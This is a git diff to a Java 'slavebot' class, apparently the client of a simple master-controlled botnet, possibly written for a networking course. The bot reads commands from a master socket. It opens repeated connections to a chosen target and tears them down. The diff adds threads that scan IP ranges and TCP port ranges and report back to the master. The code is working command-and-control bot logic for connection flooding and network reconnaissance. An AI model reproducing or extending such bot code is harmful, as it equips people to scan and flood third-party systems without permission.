@@ -4,6 +4,7 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintStream;
+import java.net.InetAddress;
 import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
@@ -67,10 +68,12 @@ public class slavebot extends Thread {
 		PrintStream pstream = new PrintStream(mastersock.getOutputStream());
 
 		while ((comM = in.readLine()) != null) {
-			if (comM.equals("connection?")) {
-				pstream.println("Waiting for command.");
-				continue;
-			}
+			// if (comM.equals("connection?")) {
+			// pstream.println("Waiting for command.");
+			// continue;
+			// }
+
+			pstream.println("From slave: get command.");
 
 			System.out.println("Get command:\n" + comM);
 
@@ -79,37 +82,57 @@ public class slavebot extends Thread {
 
 			commandParser par = new commandParser(comM);
 
-			String tIden = par.getTargetIdentifier();
-			String tType = par.getTargetIdentifierType();
-			int tport = par.getTargetport();
-			String option = par.getOption();
 			int cmdtype = par.getCommandType();
 
-			int n = par.getRepeattimes(); // 0 means disconnect
+			// connect and disconnect
+			if (cmdtype < 4) {
+				String tIden = par.getTargetIdentifier();
+				String tType = par.getTargetIdentifierType();
+				int tport = par.getTargetport();
+				String option = par.getOption();
+				int n = par.getRepeattimes(); // 0 means disconnect
 
-			// connect to target(s)
-			if (cmdtype == 2) {
-				for (int i = 0; i < n; i++) {
-					slavebot child = new slavebot(tIden, tport, option);
-					child.start();
+				// connect to target(s)
+				if (cmdtype == 2) {
+					for (int i = 0; i < n; i++) {
+						slavebot child = new slavebot(tIden, tport, option);
+						child.start();
+					}
+					pstream.println("From slave: connection setted.");
+
 				}
-			}
-			// disconnect to target (one specific port or all ports)
-			else if (cmdtype == 3) {
-				int ind = getElementIndex(tIden, tType, tport);
-				while (ind != -1) {
-					terminate(ind);
-					ind = getElementIndex(tIden, tType, tport);
+				// disconnect to target (one specific port or all ports)
+				else if (cmdtype == 3) {
+					int ind = getElementIndex(tIden, tType, tport);
+					while (ind != -1) {
+						terminate(ind);
+						ind = getElementIndex(tIden, tType, tport);
+					}
+					System.out.println("Diconnected.");
+					pstream.println("From slave: disconnection done.");
 				}
-				System.out.println("Diconnected.");
 			}
 			// ipscan
 			else if (cmdtype == 4) {
-
+				System.out.println("Start ip scanning...");
+				pstream.println("From slave: ipscan start...");
+				
+				List<Integer> ip1 = par.getIp1();
+				List<Integer> ip2 = par.getIp2();
+				new Thread(new ipscanner(ip1,ip2, mastersock)).start();
+				
 			}
 			// tcpportscan
 			else if (cmdtype == 5) {
-
+				System.out.println("Start tcpport scanning...");
+				pstream.println("From slave: tcpportscan start...");
+				
+				String tIden = par.getTargetIdentifier();
+				int tport = par.getTargetport();
+				int tport2 = par.getTargetport2();
+				
+				new Thread(new portscanner(tIden, tport, tport2, mastersock)).start();
+				
 			}
 
 		}
@@ -182,7 +205,7 @@ public class slavebot extends Thread {
 
 			PrintStream pstream = new PrintStream(targetsock.getOutputStream());
 			System.out.println("Try to connect " + targetname + " at port " + targetport + " and write some message.");
-			pstream.println("test message");
+			pstream.println("test message to target");
 
 		} catch (IOException e) {
 			System.out.println(e);
